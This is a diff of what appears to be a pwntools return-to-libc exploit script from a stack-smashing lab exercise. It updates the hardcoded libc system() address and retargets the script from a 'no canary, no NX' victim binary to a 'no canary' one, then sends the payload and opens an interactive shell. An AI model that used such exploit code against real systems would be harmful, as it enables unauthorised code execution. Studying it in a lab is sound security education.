@@ -12,7 +12,7 @@ def smash_no_canary():
     # important addresses
 
     # address of libc_system at runtime
-    libc_system = 0x7ffff7e12290
+    libc_system = 0x7ffff7e1f290
     libc_exit = 0x7ffff7e06a40
 
     # addresses of libc before linking (relative addresses)
@@ -53,7 +53,7 @@ def smash_no_canary():
     with open("payload.txt", "wb") as bin:
         bin.write(payload)
 
-    p = process("./victim_no_canary_no_nx")
+    p = process("./victim_no_canary")
     p.send(payload)
     p.interactive()
 
